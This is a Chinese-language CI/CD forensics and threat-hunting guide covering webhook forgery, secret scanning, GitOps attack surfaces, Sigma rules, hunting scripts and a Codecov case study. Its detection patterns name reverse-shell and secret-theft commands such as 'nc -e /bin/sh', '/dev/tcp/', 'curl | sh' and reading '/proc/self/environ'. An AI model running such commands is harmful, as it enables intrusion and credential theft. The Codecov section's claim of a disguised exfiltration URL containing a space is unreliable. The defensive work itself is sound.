### Webhook 劫持与事件伪造

Webhook 是 CI/CD 管道的触发机制，如果 Webhook Secret 配置不当或泄露，攻击者可以伪造事件触发任意 Workflow 执行。

| 攻击手法 | 具体实现 | 防御措施 |
|---------|---------|---------|
| Webhook Secret 猜测 | 使用弱随机数生成的 Secret | 使用 CSPRNG 生成 ≥32 字节 Secret |
| Webhook URL 泄露 | URL 包含在日志、代码或配置中 | 定期轮换 Webhook URL |
| 重放攻击 | 捕获并重放合法 Webhook 请求 | 验证时间戳和 nonce |
| 事件类型伪造 | 发送未预期的事件类型 | 严格验证 `X-GitHub-Event` 头 |
| Payload 篡改 | 修改 Webhook Payload 中的关键字段 | 验证 HMAC 签名 |

**Webhook 签名验证示例（GitHub）：**

```bash
#!/bin/bash
SECRET="$WEBHOOK_SECRET"
SIGNATURE="$HTTP_X_HUB_SIGNATURE_256"
PAYLOAD="$REQUEST_BODY"

EXPECTED="sha256=$(echo -n "$PAYLOAD" | openssl dgst -sha256 -hmac "$SECRET" | awk '{print $2}')"

if [ "$SIGNATURE" = "$EXPECTED" ]; then
  echo "Webhook signature verified"
else
  echo "Webhook signature MISMATCH - potential forgery"
  exit 1
fi
```

### 仓库权限提升与越权合并

在 CI/CD 环境中，仓库权限管理不当可能导致横向移动和越权操作。

| 权限提升路径 | 攻击前提 | 影响 | MITRE ATT&CK |
|------------|---------|------|-------------|
| Collaborator → Admin | 获得 Owner 邀请或 SSO 令牌 | 完全控制仓库 | T1078.004 |
| Fork → Upstream | Upstream 启用了 Allow Fork Sync | 向 Upstream 注入恶意代码 | T1195.002 |
| Member → Org Owner | 获得 Org Owner 权限 | 控制所有仓库和 Secrets | T1078.004 |
| Bot Token 泄露 | GitHub App/Token 密钥泄露 | 以 Bot 身份执行操作 | T1552.001 |

### Git 历史篡改检测

Git 的分布式特性使得历史篡改难以完全防止，但通过多种手段可以检测篡改行为。

```bash
git reflog --all | head -100
git fsck --full --no-reflogs
git fsck --lost-found
git log --all --graph --oneline | head -50
git log --all --diff-filter=D --summary | grep "delete mode"
```

**Git 历史篡改检测矩阵：**

| 检测维度 | 检测命令 | 异常指标 |
|---------|---------|---------|
| 引用异常 | `git reflog show --all` | 出现非操作者创建的 reflog 条目 |
| 孤儿对象 | `git fsck --unreachable` | 存在大量 unreachable commit |
| 签名不一致 | `git log --show-signature` | 部分 commit 签名无效 |
| 分支异常 | `git branch -a -v` | 出现未知的远程分支 |
| 时间线异常 | `git log --format='%H %ai %an %s'` | Commit 时间与作者不匹配 |

---

## 0x06 Secret 管理与凭证泄露检测

### CI/CD 变量中的 Secret 管理

CI/CD 环境中的 Secret 管理是安全取证的关键领域。不同平台提供了不同的 Secret 管理机制，但都存在潜在的泄露风险。

| 平台 | Secret 类型 | 加密方式 | 自动 Mask | 访问控制 | 取证命令 |
|-----|-----------|---------|----------|---------|---------|
| GitHub Actions | Repository Secret | AES-256-GCM | 自动（匹配值） | 仓库/环境级 | `gh api repos/{owner}/{repo}/actions/secrets --jq '.secrets[].name'` |
| GitHub Actions | Organization Secret | AES-256-GCM | 自动 | 组织/仓库级 | `gh api orgs/{org}/actions/secrets --jq '.secrets[].name'` |
| GitLab CI | Project Variable | AES-256-CBC | 可配置 | 项目/组级 | `glab ci variable list` |
| GitLab CI | Group Variable | AES-256-CBC | 可配置 | 组级 | `glab api groups/{id}/variables` |
| Jenkins | Credentials | 可配置（Plain/Crypt） | 否 | 全局/文件/域级 | `jenkins-cli list-credentials` |

### 日志中的 Token 泄露检测

CI/CD 日志是 Token 泄露的高发区域。尽管各平台都提供了自动 Mask 机制，但仍有多种绕过方式。

**常见 Token 格式与检测规则：**

| Token 类型 | 泄露格式示例 | 正则检测规则 | 影响 |
|-----------|------------|------------|------|
| GitHub PAT | `ghp_xxxxxxxxxxxx` | `ghp_[A-Za-z0-9]{36}` | 仓库/组织完全控制 |
| GitHub OAuth | `gho_xxxxxxxxxxxx` | `gho_[A-Za-z0-9]{36}` | 用户级别访问 |
| GitHub App Token | `(ghu\|ghs)_xxxxxx` | `(ghu\|ghs)_[A-Za-z0-9]{36}` | App 级别访问 |
| GitLab PAT | `glpat-xxxxxxxx` | `glpat-[A-Za-z0-9\-_]{20,}` | 项目/组访问 |
| npm Token | `npm_xxxxxxxxxx` | `npm_[A-Za-z0-9]{36}` | npm 包发布权限 |
| PyPI Token | `pypi-xxxxxxxxx` | `pypi-[A-Za-z0-9\-_]{60,}` | PyPI 包发布权限 |
| AWS Access Key | `AKIAxxxxxxxx` | `AKIA[0-9A-Z]{16}` | AWS 资源访问 |
| Slack Token | `xoxb-xxxxxxxx` | `xoxb-[0-9]{10,13}-[0-9]{10,13}-[A-Za-z0-9]{24}` | Slack Bot 访问 |

**自动化 Token 泄露扫描脚本：**

```bash
#!/bin/bash
TARGET_DIR="${1:-.}"
REPORT_FILE="secret_scan_report.txt"
> "$REPORT_FILE"

PATTERNS=(
  'ghp_[A-Za-z0-9]{36}'
  'gho_[A-Za-z0-9]{36}'
  'ghs_[A-Za-z0-9]{36}'
  'glpat-[A-Za-z0-9\-_]{20,}'
  'npm_[A-Za-z0-9]{36}'
  'pypi-[A-Za-z0-9\-_]{60,}'
  'AKIA[0-9A-Z]{16}'
  'xoxb-[0-9]{10,13}-[0-9]{10,13}-[A-Za-z0-9]{24}'
  'sk-[A-Za-z0-9]{32,}'
  'AIza[0-9A-Za-z\-_]{35}'
)

for pattern in "${PATTERNS[@]}"; do
  results=$(grep -rnI --include="*.yml" --include="*.yaml" --include="*.json" --include="*.env" --include="*.sh" \
    -E "$pattern" "$TARGET_DIR" 2>/dev/null)
  if [ -n "$results" ]; then
    echo "=== Pattern: $pattern ===" >> "$REPORT_FILE"
    echo "$results" >> "$REPORT_FILE"
    echo "" >> "$REPORT_FILE"
  fi
done

echo "Scan complete. Report: $REPORT_FILE"
cat "$REPORT_FILE"
```

### OIDC Token 滥用与 Identity Federation 攻击

GitHub Actions 的 OIDC Token 机制允许 Workflow 直接从云平台获取短期凭证，无需存储长期密钥。然而，这一机制也可能被滥用。

**OIDC Token 攻击面：**

| 攻击手法 | 具体实现 | 影响 | 检测方法 |
|---------|---------|------|---------|
| Audience 伪造 | 在 `id-token: write` 权限下获取其他 Audience 的 Token | 跨云平台凭证获取 | 审计 `actions/id-token` 权限使用 |
| OIDC Issuer 冒充 | 在 Self-hosted Runner 上伪造 Token 发放 | 获取云平台访问权限 | 验证 Token 中的 Issuer 和 Subject |
| 条件绕过 | 绕过 OIDC 的 `sub`/`aud` 条件限制 | 获得超出预期的云资源访问 | 审计 OIDC 条件配置 |
| Token 持久化 | 将短期 Token 持久化到文件或缓存 | 延长 Token 有效窗口 | 监控 Token 文件创建 |

**OIDC Token 审计命令：**

```bash
gh api repos/{owner}/{repo}/actions/workflows/{workflow_id}/runs \
  --jq '.workflow_runs[] | select(.event == "workflow_dispatch" or .event == "push") | {
    id: .id,
    status: .conclusion,
    created: .created_at,
    actor: .actor.login,
    event: .event,
    head_branch: .head_branch
  }' | jq 'sort_by(.created) | reverse'
```

### 凭证轮换与泄露响应

当发现 CI/CD 环境中的凭证泄露时，需要立即执行应急响应流程：

| 响应步骤 | 操作内容 | 优先级 | 时间窗口 |
|---------|---------|-------|---------|
| 1. 凭证立即撤销 | 撤销泄露的 Token/Key | 🔴 P0 | 立即 |
| 2. Workflow 暂停 | 禁用所有 Workflow 触发 | 🔴 P0 | 立即 |
| 3. 日志清理 | 从日志中移除泄露的凭证（平台 Mask 或 API 清除） | 🔴 P0 | 1 小时内 |
| 4. 影响评估 | 确定泄露凭证的访问范围和被访问的资源 | 🟡 P1 | 4 小时内 |
| 5. 新凭证生成 | 生成新的凭证并更新所有引用 | 🟡 P1 | 8 小时内 |
| 6. 访问审计 | 检查泄露期间的异常访问记录 | 🟡 P1 | 24 小时内 |
| 7. 安全加固 | 修复导致泄露的根本原因 | 🟢 P2 | 72 小时内 |

### 自动化 Secret 扫描工具

| 工具名称 | 功能定位 | 检测范围 | 集成方式 |
|---------|---------|---------|---------|
| GitHub Secret Scanning | GitHub 原生密钥扫描 | Push Protection + 历史扫描 | 内置（需启用） |
| Gitleaks | Git 历史密钥扫描 | Git 提交历史中的密钥 | CLI / CI 集成 |
| TruffleHog | 深度 Git 密钥扫描 | Git 历史 + 文件系统 | CLI |
| detect-secrets | Yelp 开发的密钥检测 | 文件内容和配置 | Python 库 / pre-commit hook |
| GitGuardian | SaaS 密钥监控 | 代码仓库 + 实时监控 | GitHub App / CLI |

---

## 0x07 部署管道与 GitOps 工作流攻击

### ArgoCD 安全与攻击面

ArgoCD 是最流行的 Kubernetes GitOps 持续交付工具，其安全性直接关系到 Kubernetes 集群的安全。ArgoCD 的攻击面涵盖多个维度。

| 攻击面 | 攻击手法 | MITRE ATT&CK | 具体影响 |
|-------|---------|-------------|---------|
| ApplicationSet 注入 | 恶意模板渲染 | T1195.002 | 批量部署恶意 Manifest |
| RBAC 绕过 | 利用默认 admin 密码或弱 RBAC | T1078.001 | 获取集群完全控制 |
| Git 仓库投毒 | 篡改 ArgoCD 监控的 Git 仓库 | T1195.002 | 部署恶意应用 |
| API Server 暴露 | 未正确配置网络策略 | T1190 | 未授权访问 |
| Repo Server SSRF | 恶意 Helm Chart/Plugin | T1190 | 服务端请求伪造 |
| Session 劫持 | 窃取 argocd-server Session Cookie | T1539 | 身份冒充 |

**ArgoCD 安全检查命令：**

```bash
kubectl get configmap argocd-cm -n argocd -o yaml | grep -A5 "admin.enabled"
kubectl get configmap argocd-rbac-cm -n argocd -o yaml
kubectl get secret argocd-initial-admin-secret -n argocd -o jsonpath='{.data.password}' | base64 -d
kubectl get applications -n argocd -o json | jq '.items[] | {
  name: .metadata.name,
  repo: .spec.source.repoURL,
  path: .spec.source.path,
  targetRevision: .spec.source.targetRevision,
  server: .spec.destination.server
}'
```

**ArgoCD RBAC 配置审计：**

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: argocd-rbac-cm
  namespace: argocd
data:
  policy.default: role:readonly
  policy.csv: |
    p, role:admin, applications, *, */*, allow
    p, role:admin, clusters, get, *, allow
    p, role:admin, repositories, *, *, allow
    p, role:admin, accounts, *, *, allow
    g, admin, role:admin
    g, oidc-group, role:readonly
```

### FluxCD 安全分析

FluxCD 是另一个主流的 GitOps 工具，其安全模型与 ArgoCD 有所不同。

| 攻击面 | FluxCD 组件 | 攻击手法 | 检测方法 |
|-------|------------|---------|---------|
| Kustomization 篡改 | kustomize-controller | 修改 Kustomization 文件中的源引用 | 审计 `kustomization` 资源变更 |
| HelmRelease 投毒 | helm-controller | 替换 Helm Chart 仓库 URL 或版本 | 监控 `helmrelease` 资源变更 |
| GitRepository 污染 | source-controller | 篡改 Git 仓库 URL 或分支 | 审计 `gitrepository` 资源 |
| Notification 虹吸 | notification-controller | 利用 Webhook 通知泄露信息 | 监控出站通知 |
| SOPS 密钥泄露 | kustomize-controller | 解密后的 Secret 未正确保护 | 审计 SOPS 密钥管理 |

**FluxCD 安全检查命令：**

```bash
kubectl get kustomizations -A -o json | jq '.items[] | {
  name: .metadata.name,
  namespace: .metadata.namespace,
  sourceRef: .spec.sourceRef,
  path: .spec.path,
  prune: .spec.prune,
  interval: .spec.interval
}'

kubectl get helmreleases -A -o json | jq '.items[] | {
  name: .metadata.name,
  namespace: .metadata.namespace,
  chart: .spec.chart.spec.chart,
  version: .spec.chart.spec.version,
  sourceRef: .spec.chart.spec.sourceRef
}'

kubectl get gitrepositories -A -o json | jq '.items[] | {
  name: .metadata.name,
  url: .spec.url,
  ref: .spec.ref,
  interval: .spec.interval
}'
```

### Kubernetes Manifest 篡改

Kubernetes Manifest 是部署管道的核心数据，其完整性直接决定集群中运行的应用状态。

| 篡改类型 | 攻击手法 | 影响 | 检测方法 |
|---------|---------|------|---------|
| 镜像替换 | 修改 `image` 字段指向恶意镜像 | 运行恶意容器 | OPA/Gatekeeper 策略 + 镜像摘要验证 |
| 资源限制移除 | 删除 `resources.limits` | 资源耗尽攻击 | Kyverno 策略检查 |
| 权限提升 | 添加 `hostNetwork`/`hostPID`/`privileged` | 容器逃逸 | Pod Security Standards / PSA |
| 环境变量注入 | 在 Env 中添加敏感数据 | 凭证泄露 | Secret 管理审计 |
| Volume 挂载 | 挂载敏感宿主路径 | 宿主机文件读取 | Pod Security 策略 |
| ServiceAccount 绑定 | 绑定高权限 ServiceAccount | 集群级别权限提升 | RBAC 审计 |

### Drift 检测与不可变基础设施

GitOps 的核心理念是 Git 作为唯一可信来源。Drift（漂移）是指集群实际状态与 Git 中声明的期望状态不一致。

```bash
flux diff kustomization <name> --path <path>

flux trace <resource> --kind <kind> --namespace <ns>

kubectl get events -n <namespace> --field-selector reason=DriftDetection
```

**Drift 检测审计矩阵：**

| 检测维度 | 检测方法 | 告警条件 |
|---------|---------|---------|
| 配置 Drift | `flux diff kustomization` | 存在差异 |
| 镜像 Drift | 比对运行中 Pod 的镜像与 Git 声明 | 镜像不匹配 |
| 权限 Drift | RBAC 策略变更检测 | 出现新权限 |
| 网络 Drift | NetworkPolicy 变更检测 | 策略变更 |

### 部署管道审计日志分析

全面的审计日志分析是部署管道取证的基础。

```bash
kubectl get events -A --sort-by='.lastTimestamp' -o json | \
  jq -r '.items[] | select(.reason == "Started" or .reason == "Pulled" or .reason == "Created" or .reason == "Killing") | "\(.lastTimestamp) [\(.involvedObject.namespace)/\(.involvedObject.name)] \(.reason): \(.message)"' | tail -100

kubectl logs -n argocd -l app.kubernetes.io/name=argocd-server --since=24h | grep -i "login\|sync\|create\|delete\|update"
```

---

## 0x08 证据强度分层与案例关联

在 CI/CD 管道安全取证中，不同类型的证据具有不同的证明力。将证据按照确定性从高到低进行分层，有助于构建完整的攻击链和制定响应优先级。

### 🔴 确认恶意证据

以下证据一旦确认，可以明确判定为恶意行为：

| 证据类型 | 检查命令 | 判定标准 |
|---------|---------|---------|
| Workflow 文件包含恶意命令 | `git log -p -- .github/workflows/*.yml \| grep -E "(curl\|wget\|base64\|eval\|exec)"` | Workflow 文件中存在将数据外传或执行恶意代码的步骤 |
| Secret 被外传到非预期地址 | `gh api repos/{owner}/{repo}/actions/runs/{run_id}/logs` | 日志中显示 Secret 被发送到外部服务器 |
| 制品签名不匹配 | `cosign verify --key cosign.pub IMAGE` | 签名验证失败，证书身份不匹配 |
| Rekor 透明日志缺失 | `rekor-cli search --email EMAIL` | 预期的签名在透明日志中不存在 |
| 恶意依赖包安装 | `npm ls --all \| grep -E "typosquat\|malicious"` | 检测到已知恶意包 |
| 构建产物哈希不一致 | `sha256sum dist/* \| diff - expected_hashes.txt` | 构建产物哈希与预期不匹配 |
| 不可解释的 Workflow 触发 | `gh api repos/{owner}/{repo}/actions/runs \| jq '.workflow_runs[] \| select(.actor.login != "expected_user")'` | 非预期用户触发了生产部署 |

### 🟡 高度可疑证据

以下证据需要进一步调查以确认是否为恶意行为：

| 证据类型 | 检查命令 | 可疑指标 |
|---------|---------|---------|
| 新增的 Workflow 文件 | `git log --oneline --diff-filter=A -- ".github/workflows/"` | 未经审查的新 Workflow 文件 |
| 不寻常的构建时间 | `gh api repos/{owner}/{repo}/actions/runs \| jq '.workflow_runs[] \| {created: .created_at, branch: .head_branch}'` | 非工作时间的构建活动 |
| Secret 访问异常 | `gh api orgs/{org}/audit-log --jq '.[] \| select(.action == "org.add_member")'` | 新成员获得了 Secret 访问权限 |
| 依赖版本异常跳变 | `git log -p -- package.json \| grep -A1 -B1 "version"` | 依赖版本出现异常跳跃 |
| Runner 上的异常进程 | `ps aux \| grep -v -E "(runner\|actions\|node\|git)"` | Self-hosted Runner 上运行非预期进程 |
| 缓存大小异常 | `gh api repos/{owner}/{repo}/actions/caches \| jq '.actions_caches[] \| select(.size_in_bytes > 100000000)'` | 异常大的构建缓存条目 |
| Webhook 配置变更 | `gh api repos/{owner}/{repo}/hooks` | 新增或修改了 Webhook 配置 |

### 🟢 需要关注证据

以下证据需要在常规安全审计中关注，可能指示潜在的安全风险：

| 证据类型 | 检查命令 | 关注指标 |
|---------|---------|---------|
| 过期的依赖版本 | `npm outdated \| head -20` | 长期未更新的依赖 |
| 缺失的签名验证 | `git log --show-signature --format='%G?' \| grep "N"` | 未经签名的 Commit |
| 弱密钥算法 | `gpg --list-keys \| grep -E "RSA [0-9]{1,4}\|DSA [0-9]{1,4}"` | 使用弱密钥算法的 GPG 密钥 |
| 过长的 Token 有效期 | 审计 Secret 创建时间 | 超过 90 天未轮换的 Token |
| 宽松的 Branch Protection | `gh api repos/{owner}/{repo}/branches/main/protection` | 缺失必要的保护规则 |
| 公开的仓库包含敏感文件 | `find . -name "*.pem" -o -name "*.key" -o -name ".env"` | 敏感文件被提交到公开仓库 |

---

## 0x09 自动化检测与狩猎

### Sigma YAML 规则

Sigma 规则是通用的检测规则格式，可以在多种 SIEM 和日志分析平台中执行。以下规则针对 CI/CD 管道中的常见攻击场景。

**规则一：检测 GitHub Actions Workflow Injection 攻击**

```yaml
title: Suspicious GitHub Actions Workflow Injection Pattern
id: 3f7a8b2c-1d4e-5f6a-9b0c-2d3e4f5a6b7c
status: stable
description: Detects potential Workflow Injection attacks in GitHub Actions workflow execution logs
references:
  - https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
author: Security Operations Center
date: 2026-07-13
modified: 2026-07-13
tags:
  - attack.execution
  - attack.t1059
  - attack.supply_chain
  - attack.t1195.002
  - ci_cd
  - github_actions
  - workflow_injection
logsource:
  category: ci_cd_workflow
  product: github_actions
detection:
  selection_step_output:
    message|contains:
      - 'Process completed with exit code'
      - 'Error: Process completed'
  selection_suspicious_patterns:
    message|re:
      - '(curl|wget)\s+.*\s+\|(\s*(ba)?sh)'
      - 'base64\s+(-d|--decode)\s+.*\s*\|(\s*(ba)?sh)'
      - 'eval\s+\$'
      - 'python[23]?\s+-c\s+.*import\s+(os|subprocess|socket)'
      - 'nc\s+-.*-e\s+/bin/(ba)?sh'
      - '/dev/tcp/'
      - '>\s*/dev/tcp/'
      - 'exec\s+2>&1\s*&&\s*(curl|wget)'
  selection_env_extraction:
    message|contains:
      - 'env | grep -i'
      - 'printenv'
      - 'env | sort'
      - 'cat /proc/self/environ'
  selection_secret_access:
    message|contains:
      - '${{ secrets.'
      - '${{ env.'
      - 'GITHUB_TOKEN'
      - 'GH_PAT'
      - 'NPM_TOKEN'
      - 'PYPI_TOKEN'
  condition: selection_step_output and (selection_suspicious_patterns or selection_env_extraction or selection_secret_access)
falsepositives:
  - Legitimate CI scripts using curl/wget for downloading build dependencies
  - Security scanning tools that intentionally read environment variables
level: high
```

**规则二：检测异常的 CI/CD Workflow 触发活动**

```yaml
title: Anomalous CI/CD Workflow Trigger Activity
id: 5e8d9f3a-2b1c-4d6e-8f0a-1b2c3d4e5f6a
status: stable
description: Detects anomalous CI/CD workflow triggers that may indicate unauthorized pipeline execution
references:
  - https://owasp.org/www-project-top-10-ci-cd-security-risks/
author: Security Operations Center
date: 2026-07-13
modified: 2026-07-13
tags:
  - attack.initial_access
  - attack.t1195.002
  - attack.credential_access
  - attack.t1078.004
  - ci_cd
  - github_actions
  - gitlab_ci
  - workflow_trigger
logsource:
  category: ci_cd_audit
detection:
  selection_dispatch_trigger:
    event_type:
      - 'workflow_dispatch'
      - 'repository_dispatch'
      - 'workflow_run'
  selection_new_actor:
    actor|is_diff: true
  selection_off_hours:
    timestamp|time: 'T00:00:00/T06:00:00'
  selection_foreign_branch:
    head_branch|startswith: 'dependabot/'
    head_branch|contains:
      - 'renovate'
      - 'patch'
      - 'update'
  selection_privileged_workflow:
    workflow_name|contains:
      - 'deploy'
      - 'release'
      - 'publish'
      - 'secrets'
      - 'admin'
  condition: selection_dispatch_trigger and (selection_new_actor or (selection_off_hours and selection_privileged_workflow))
falsepositives:
  - Scheduled releases during off-hours
  - Automated dependency update bots (Dependabot, Renovate)
  - On-call engineer triggering emergency deployments
level: medium
```

### Bash 自动化狩猎脚本

以下脚本用于全面扫描 GitHub Actions Workflow 文件中的安全漏洞：

```bash
#!/bin/bash
set -euo pipefail

REPO="${1:-.}"
REPORT="workflow_security_report_$(date +%Y%m%d_%H%M%S).txt"
FINDINGS=0

cat > "$REPORT" <<EOF
=====================================
CI/CD Workflow Security Scan Report
=====================================
Repository: $REPO
Scan Date:  $(date -u +"%Y-%m-%d %H:%M:%S UTC")
=====================================
EOF

scan_injection_patterns() {
    local file="$1"
    local patterns=(
        '\$\{\{.*github\.event\.(issue|pull_request|comment|review|head_commit)\.'
        'run:\s*.*\$\{\{[^}]*\}\}'
        'eval\s'
        'exec\s'
        'base64\s+(-d|--decode)'
        '/dev/tcp/'
        'curl\s+.*\|\s*(ba)?sh'
        'wget\s+.*\|\s*(ba)?sh'
    )
    for pat in "${patterns[@]}"; do
        grep -nE "$pat" "$file" 2>/dev/null | while read -r line; do
            echo "[INJECTION] $file:$line" >> "$REPORT"
            FINDINGS=$((FINDINGS + 1))
        done
    done
}

scan_secret_leaks() {
    local file="$1"
    local secret_patterns=(
        'secrets\.[A-Z_]+'
        'GITHUB_TOKEN'
        'GH_PAT'
        'NPM_TOKEN'
        'PYPI_TOKEN'
        'AWS_ACCESS_KEY_ID'
        'DOCKER_PASSWORD'
    )
    for pat in "${secret_patterns[@]}"; do
        grep -nE "$pat" "$file" 2>/dev/null | grep -v "^\s*#" | while read -r line; do
            echo "[SECRET_REF] $file:$line" >> "$REPORT"
            FINDINGS=$((FINDINGS + 1))
        done
    done
}

scan_insecure_actions() {
    local file="$1"
    grep -nE 'uses:\s+\S+@[a-zA-Z0-9_-]+$' "$file" 2>/dev/null | while read -r line; do
        echo "[UNPINNED_ACTION] $file:$line" >> "$REPORT"
        FINDINGS=$((FINDINGS + 1))
    done
    grep -nE 'permissions:' "$file" 2>/dev/null | head -1 | while read -r line; do
        if grep -A5 "permissions:" "$file" 2>/dev/null | grep -qE "write-all|contents:\s*write"; then
            echo "[EXCESS_PERMS] $file:$line" >> "$REPORT"
            FINDINGS=$((FINDINGS + 1))
        fi
    done
}

echo "Scanning workflow files in: $REPO" | tee -a "$REPORT"

find "$REPO" -name "*.yml" -o -name "*.yaml" | while read -r wf; do
    if echo "$wf" | grep -qE "\.github/workflows|\.gitlab-ci"; then
        echo "Analyzing: $wf" >> "$REPORT"
        scan_injection_patterns "$wf"
        scan_secret_leaks "$wf"
        scan_insecure_actions "$wf"
    fi
done

echo "" >> "$REPORT"
echo "Total findings: $FINDINGS" >> "$REPORT"
echo "Report saved to: $REPORT"
```

### Python 自动化检测脚本

以下 Python 脚本用于分析 CI/CD 审计日志，检测异常活动模式：

```python
import json
import sys
import re
from datetime import datetime, timedelta
from collections import defaultdict

SUSPICIOUS_PATTERNS = {
    "workflow_injection": [
        r"curl\s+.*\|\s*(ba)?sh",
        r"wget\s+.*\|\s*(ba)?sh",
        r"base64\s+(-d|--decode)",
        r"eval\s+\$",
        r"/dev/tcp/",
        r"python[23]?\s+-c\s+.*import\s+(os|subprocess|socket)",
    ],
    "secret_extraction": [
        r"env\s*\|\s*grep\s+-i",
        r"printenv",
        r"cat\s+/proc/self/environ",
        r"env\s*\|\s*sort",
        r"secrets\.[A-Z_]+",
    ],
    "persistence": [
        r"crontab",
        r"systemctl\s+(enable|start)",
        r"launchctl\s+(load|start)",
        r"authorized_keys",
        r"bashrc|zshrc|profile",
    ],
    "exfiltration": [
        r"nc\s+-",
        r"ncat\s+",
        r"socat\s+",
        r"ssh\s+-R\s+",
        r"tgz|tar\s+.*\|\s*(curl|wget)",
    ],
}

OFF_HOURS_START = 0
OFF_HOURS_END = 6


def parse_workflow_log(log_data):
    findings = []
    for step in log_data.get("steps", []):
        step_name = step.get("name", "unknown")
        step_output = step.get("output", "")
        for category, patterns in SUSPICIOUS_PATTERNS.items():
            for pattern in patterns:
                matches = re.finditer(pattern, step_output, re.IGNORECASE)
                for match in matches:
                    findings.append({
                        "step": step_name,
                        "category": category,
                        "pattern": pattern,
                        "match": match.group()[:100],
                        "line_context": _get_context(step_output, match.start()),
                    })
    return findings


def analyze_trigger_patterns(runs_data):
    anomalies = []
    actor_history = defaultdict(int)
    for run in runs_data:
        actor = run.get("actor", {}).get("login", "unknown")
        actor_history[actor] += 1

    for run in runs_data:
        created = datetime.fromisoformat(
            run.get("created_at", "").replace("Z", "+00:00")
        )
        actor = run.get("actor", {}).get("login", "unknown")
        event = run.get("event", "unknown")
        branch = run.get("head_branch", "unknown")

        if created.hour >= OFF_HOURS_START and created.hour < OFF_HOURS_END:
            if event in ("workflow_dispatch", "repository_dispatch"):
                anomalies.append({
                    "run_id": run.get("id"),
                    "actor": actor,
                    "time": created.isoformat(),
                    "event": event,
                    "branch": branch,
                    "reason": "off_hours_dispatch",
                    "severity": "high",
                })

        if actor_history[actor] <= 2 and event == "workflow_dispatch":
            anomalies.append({
                "run_id": run.get("id"),
                "actor": actor,
                "time": created.isoformat(),
                "event": event,
                "branch": branch,
                "reason": "rare_actor_dispatch",
                "severity": "medium",
            })

        if any(kw in branch.lower() for kw in ["dependabot", "renovate", "patch"]):
            if event == "push" and run.get("conclusion") == "success":
                anomalies.append({
                    "run_id": run.get("id"),
                    "actor": actor,
                    "time": created.isoformat(),
                    "event": event,
                    "branch": branch,
                    "reason": "dependency_update_push",
                    "severity": "low",
                })

    return anomalies


def analyze_audit_log(audit_events):
    high_risk_actions = [
        "org.add_member",
        "org.remove_member",
        "repo.destroy",
        "repo.dependency_graph.snapshots",
        "actions.secret_accessed",
        "actions.secret_deleted",
        "repo.branch_protection_rule",
        "repo.webhook_created",
        "repo.webhook_updated",
    ]
    alerts = []
    for event in audit_events:
        action = event.get("action", "")
        if action in high_risk_actions:
            severity = "critical" if "secret" in action else "high"
            alerts.append({
                "action": action,
                "actor": event.get("actor", {}).get("login", "unknown"),
                "repo": event.get("repo", {}).get("name", "unknown"),
                "time": event.get("created_at", "unknown"),
                "severity": severity,
            })
    return alerts


def _get_context(text, pos, window=80):
    start = max(0, pos - window)
    end = min(len(text), pos + window)
    return text[start:end].replace("\n", " ")


def generate_report(findings, trigger_anomalies, audit_alerts):
    report = []
    report.append("=" * 60)
    report.append("CI/CD Security Audit Report")
    report.append(f"Generated: {datetime.utcnow().isoformat()}")
    report.append("=" * 60)

    report.append(f"\n[Workflow Injection Findings]: {len(findings)}")
    for f in findings:
        report.append(f"  [{f['category'].upper()}] Step: {f['step']}")
        report.append(f"    Pattern: {f['pattern']}")
        report.append(f"    Match: {f['match']}")

    report.append(f"\n[Trigger Anomalies]: {len(trigger_anomalies)}")
    for a in trigger_anomalies:
        report.append(f"  [{a['severity'].upper()}] Run {a['run_id']}: {a['reason']}")
        report.append(f"    Actor: {a['actor']}, Time: {a['time']}, Branch: {a['branch']}")

    report.append(f"\n[Audit Log Alerts]: {len(audit_alerts)}")
    for a in audit_alerts:
        report.append(f"  [{a['severity'].upper()}] {a['action']}")
        report.append(f"    Actor: {a['actor']}, Repo: {a['repo']}, Time: {a['time']}")

    total = len(findings) + len(trigger_anomalies) + len(audit_alerts)
    report.append(f"\nTotal Findings: {total}")
    return "\n".join(report)


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <audit_log.json> [workflow_runs.json]")
        sys.exit(1)

    with open(sys.argv[1]) as f:
        audit_data = json.load(f)

    workflow_runs = []
    if len(sys.argv) > 2:
        with open(sys.argv[2]) as f:
            workflow_runs = json.load(f)

    wf_findings = []
    for run in workflow_runs:
        if "steps" in run:
            wf_findings.extend(parse_workflow_log(run))

    trigger_anomalies = analyze_trigger_patterns(workflow_runs)
    audit_alerts = analyze_audit_log(audit_data)

    report = generate_report(wf_findings, trigger_anomalies, audit_alerts)
    print(report)
```

---

## 0x0A 公开案例分析

### 案例一：Codecov Bash Uploader 供应链攻击（2021）

**事件概述：**

2021 年 4 月，开源代码覆盖率工具 Codecov 被发现其 Bash Uploader 脚本遭到篡改。攻击者通过入侵 Codecov 的 Docker 构建环境，修改了 Bash Uploader 脚本，使其在执行时将环境变量（包括 CI/CD Secrets）外传到攻击者控制的外部服务器。

**攻击链描述：**

```
攻击链时间线：
2021-01-31  攻击者入侵 Codecov Docker 构建环境
            │
            ▼
2021-01-31  篡改 codecov-bash 脚本，添加数据外传代码
            │  外传目标：https://codecov.io uploader bash
            │  外传内容：所有环境变量
            ▼
2021-02-01  被篡改的脚本发布到 CDN
            │  受影响版本：所有通过 curl | bash 方式下载的用户
            ▼
2021-04-01  安全研究员发现脚本异常并报告
            │
            ▼
2021-04-15  Codecov 公开披露事件
            │
            ▼
影响评估    约 29,000 个仓库受影响
            │  泄露的 Secrets 包括：GitHub Token、AWS Key、GCP Key
            ▼
后续响应    所有用户需要轮换 Secrets
```

**被篡改的脚本核心片段（分析还原）：**

```bash
# 原始脚本（简化）：
curl -s https://codecov.io/bash > codecov
bash codecov

# 被篡改后的外传逻辑（分析还原）：
# 在脚本中注入了以下数据收集和外传代码：
# 1. 收集所有环境变量
# 2. 将数据 base64 编码
# 3. 通过 HTTPS POST 发送到攻击者控制的服务器
# 外传目标服务器通过 DNS 隐蔽控制，使用 Cloudflare Workers 作为中继
```

**取证发现：**

| 取证维度 | 发现内容 | 证据强度 |
|---------|---------|---------|
| 脚本篡改 | Bash Uploader 脚本在 2021-01-31 被修改，新增环境变量收集和外传逻辑 | 🔴 确认恶意 |
| 外传目标 | 数据发送到 `https://codecov.io uploader bash`（注意 URL 中的空格，实际为伪装域名） | 🔴 确认恶意 |
| 数据范围 | 所有环境变量，包含 CI/CD Secrets、云平台凭证 | 🔴 确认恶意 |
| 影响范围 | 使用 Bash Uploader 的所有 CI/CD 环境（GitHub Actions、GitLab CI、Travis CI 等） | 🔴 确认恶意 |
